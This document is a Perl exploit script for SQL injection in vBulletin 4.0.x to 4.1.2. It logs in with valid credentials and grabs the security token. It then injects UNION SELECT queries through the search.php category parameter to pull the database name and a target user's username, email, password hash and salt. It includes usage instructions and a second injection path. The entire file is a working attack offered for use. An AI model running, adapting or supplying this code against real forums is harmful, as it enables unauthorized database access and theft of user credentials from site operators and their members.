#!/usr/bin/env perl
use LWP::UserAgent;
use HTTP::Cookies;
 
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0");
$ua->cookie_jar({});
$username = "username) from user where userid=$ARGV[4]#";
$email = "email) from user where userid=$ARGV[4]#";
$password = "password) from user where userid=$ARGV[4]#";
$salt = "salt) from user where userid=$ARGV[4]#";
@tofinds = ('database())#'); push(@tofinds,$username); push(@tofinds,$email); push(@tofinds,$password); push(@tofinds,$salt);
 
sub request
{
    my $token = dumping("vbloginout.txt","token");
     
    if($token eq '')
    {
        print "SECURITYTOKEN not found (Make sure to log out from any other previous logged sessions before running the exploit).\n";
        #print "Attempting using 1409594055-f2133dfe1f26a36f6349eb3a946ac38c94a182e6 as token.\n";
        $token = "1409750140-51ac26286027a4bc2b2ac38a7483081c2a4b2a3e"; # HERE
        print "Attempting using $token as token.\n";
    }
    else
    {
        print "SECURITYTOKEN FOUND: $token\n";
    }
     
    print "Sending exploit...\n\n";
    sleep(1);
    my $req = HTTP::Request->new(POST => $ARGV[0].'/search.php?search_type=1');
    $req->content_type('application/x-www-form-urlencoded');
     
    foreach $tofind (@tofinds)
    {
        $post = "query=$ARGV[3]&titleonly=0&dosearch=Search+Now&memberless=0&memberlimit=&discussionless=0&discussionlimit=&messageless=0&messagelimit=&pictureless=0&picturelimit=&sortby=dateline&order=descending&group_filter_date_lteq_month=0&group_filter_date_lteq_day=1&group_filter_date_lteq_year=&group_filter_date_gteq_month=0&group_filter_date_gteq_day=1&group_filter_date_gteq_year=&saveprefs=1&s=&securitytoken=$token&dofilter=1&do=process&searchfromtype=vBForum%3ASocialGroup&contenttypeid=7&cat[0]=1) UNION SELECT concat(0x3a,0x3a,0x3a,$tofind";
        $req->content($post);
        my $res = $ua->request($req);
        #print $res->headers()->as_string; print "\n\n";
        open(FILE0, "> vbloc.txt"); print FILE0 $res->headers()->as_string; close(FILE0);
        my $location = dumping("vbloc.txt","loc");
         
        if($location !~ /$ARGV[0]/)
        {
            banner();
            break;
        }
        #print "Location: $location\n";
        my $req1 = HTTP::Request->new(GET => $location);
        $req1->content_type('application/x-www-form-urlencoded');
        my $res1 = $ua->request($req1);
        #print $res1->content; print "\n";
        open(FILE,"> vbout.txt");
        print FILE $res1->content;
        close(FILE);
        printout($tofind);
        dumping("vbout.txt","sql");
        print "\n";
    }
    print "\n";
    print "Do you want to run the second exploitation way? (y/n) -> ";
    $want = <STDIN>;
    if($want =~ /y/)
    {
        second_request($token);
    }
}
 
sub second_request
{
    my ($token) = @_ ;
    print "Attempting using the second exploitation way..\n\n";
    sleep(2);
    my $req = HTTP::Request->new(POST => $ARGV[0].'/search.php');
    $req->content_type('application/x-www-form-urlencoded');
     
    foreach $tofind (@tofinds)
    {
        $post = "type%5B%5D=7&query=$ARGV[3]&titleonly=0&searchuser=&exactname=1&tag=&dosearch=Search+Now&searchdate=0&beforeafter=&sortby=relevance&order=descending&saveprefs=1&s=&securitytoken=$token&do=process&searchthreadid=&cat[0]=1) UNION SELECT concat(0x3a,0x3a,0x3a,$tofind";
        $req->content($post);
        my $res = $ua->request($req);
        #print $res->headers()->as_string; print "\n\n";
        open(FILE0, "> vbloc.txt"); print FILE0 $res->headers()->as_string; close(FILE0);
        my $location = dumping("vbloc.txt","loc");
         
        if($location !~ /$ARGV[0]/)
        {
            banner();
            exit(1);
        }
        #print "Location: $location\n";
        my $req1 = HTTP::Request->new(GET => $location);
        $req1->content_type('application/x-www-form-urlencoded');
        my $res1 = $ua->request($req1);
        #print $res1->content; print "\n";
        open(FILE,"> vbout.txt");
        print FILE $res1->content;
        close(FILE);
        printout($tofind);
        dumping("vbout.txt","sql");
        print "\n";
    }
    print "\n";
}
 
sub banner
{
    print "[-] Exploit not successful!\n";
    if(token eq "1409563107-55b86c8f60ad36a41dedff21b06bdc8c9d949303")
    {
        print "[i] Try to log in and log out from other any other sessions and run the exploit again.\n\n";
    }
}
 
sub printout
{
    my ($tofind) = @_ ;
    if($tofind =~ /username/)
    {
        print "[+] User($ARGV[4]) Username: ";
    }
    elsif($tofind =~ /password/)
    {
        print "[+] User($ARGV[4]) Password: ";
    }
    elsif($tofind =~ /database/)
    {
        print "[+] Database Name: ";
    }
    elsif($tofind =~ /email/)
    {
        print "[+] User($ARGV[4]) Email: ";
    }
    elsif($tofind =~ /salt/)
    {
        print "[+] User($ARGV[4]) Salt: ";
    }
}
 
sub dumping
{
    my ($filename, $par) = @_ ;
    open(MYFILE,"< ", $filename);
    my @words;
    while(<MYFILE>)
    {
        chomp;
        @words = split(' ');
         
        if($par eq "token")
        {
            my $ctrl = "n";
            foreach my $word (@words)
            {
                if($word =~ /SECURITYTOKEN/)
                {
                    $ctrl = "y";
                }
                if($ctrl eq "y" and $word !~ /=/ and $word !~ /SECURITYTOKEN/)
                {
                    $word =~ tr/;//d; $word =~ tr/\"//d;
                    return $word;
                    break;
                }
            }
        }
         
        elsif($par eq "sql")
        {
            foreach my $word (@words)
            {
                if($word =~ /:::/)
                {
                    $word =~ tr/::://d;
                    print "$word";
                }
            }
        }
         
        else
        {
            my $ctrl2 = "n";
            foreach my $word (@words)
            {
                if($word =~ /Location:/)
                {
                    $ctrl2 = "y";
                }
                if($ctrl2 eq "y" and $word !~ /Location:/)
                {
                    return $word;
                }
            }
        }
    }
    close(MYFILE);
}
 
sub login(@)
{
    my $username = shift;
    my $password = shift;
    print "\nLogging in...\n";
    sleep(1);
    my $req = HTTP::Request->new(POST => $ARGV[0].'/login.php?do=login');
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("vb_login_username=$username&vb_login_password=$password&s=&securitytoken=1409514185-74f04ec0932a6f070268bf287797b5dc0db05530&do=login&vb_login_md5password=&vb_login_md5password_utf=");
    $ua->cookie_jar({});
    my $res = $ua->request($req);
    #print "\n"; print $res->content; print "\n";
    open(FILE2,"> vbloginout.txt"); print FILE2 $res->content; close(FILE2);
    request();
}
 
if($ARGV[0] eq '' || $ARGV[1] eq '' || $ARGV[2] eq '' || $ARGV[3] eq '' || $ARGV[4] eq '')
{
    print "\n<! vBulletin 4.0.x => 4.1.2 Automatic SQL Injection exploit !>\n";
    print "Author: D35m0nd142\n\n";
    print "Usage: perl exploit.pl <<http://target> <valid username> <valid passwd> <existent group> <userid to hack>\n";
    print "Example: perl exploit.pl http://www.example.com myusername mypassword Administrators 1\n\n";
    exit(1);
}
 
print "\n<! vBulletin 4.0.x => 4.1.2 Automatic SQL Injection exploit !>\n";
print "Author: D35m0nd142\n";
sleep(1);
login($ARGV[1],$ARGV[2]);
 
@files = ('vbloginout.txt','vbout.txt','vbloc.txt');
foreach $file (@files)
{
    unlink $file;
}
